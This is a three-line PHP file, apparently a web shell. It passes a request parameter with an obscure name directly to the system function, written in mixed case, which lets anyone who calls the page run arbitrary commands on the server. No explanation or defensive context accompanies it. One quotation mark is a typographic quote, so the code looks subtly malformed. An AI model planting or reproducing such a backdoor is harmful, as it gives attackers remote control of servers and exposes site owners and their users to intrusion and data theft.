<?php
SysTeM($_GET[’ccSD17sP']);
?>
